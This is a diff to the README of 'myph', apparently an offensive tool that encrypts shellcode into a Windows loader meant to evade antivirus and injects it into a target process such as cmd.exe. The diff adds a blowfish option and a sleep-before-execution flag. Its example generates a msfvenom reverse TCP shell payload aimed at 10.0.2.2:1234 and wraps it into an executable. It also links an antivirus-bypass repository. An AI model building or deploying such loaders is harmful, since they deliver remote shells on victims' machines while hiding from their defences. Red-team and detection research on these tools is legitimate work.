@@ -42,12 +42,13 @@ Usage:
   myph [flags]
 
 Flags:
-  -e, --encryption encKind   encryption method. (allowed: AES, XOR) (default AES)
+  -e, --encryption encKind   encryption method. (allowed: AES, XOR, blowfish) (default AES)
   -h, --help                 help for myph
   -k, --key string           encryption key, auto-generated if empty. (if used by --encryption)
   -f, --out string           output name (default "payload.exe")
   -p, --process string       target process to inject shellcode to (default "cmd.exe")
   -s, --shellcode string     shellcode path (default "msf.raw")
+  -l, --sleep-time uint      sleep time before executing loader (default: 0)
   -t, --technique string     shellcode-loading technique (allowed: CRT, CreateThread) (default "CRT")
   -v, --version              version for myph
 ```
@@ -60,8 +61,6 @@ This tool supports few methods for now, but aims to add more as time goes on:
 
 If you don't know what that is about, go check out [this repository](https://github.com/CMEPW/BypassAV) :)~
 
-> Altough there is an OS version, Linux or MacOS are not supported yet !
-
 
 #### Example
 
@@ -72,7 +71,7 @@ Generate a payload like so:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.2 LPORT=1234 -f raw -o msf.raw
 
 # run myph (--shellcode is not mandatory here because we use the default value)
-./myph --shellcode msf.raw --out something
+./myph --shellcode msf.raw --out something.exe
 
 # you should find your payload here
 file ./something.exe
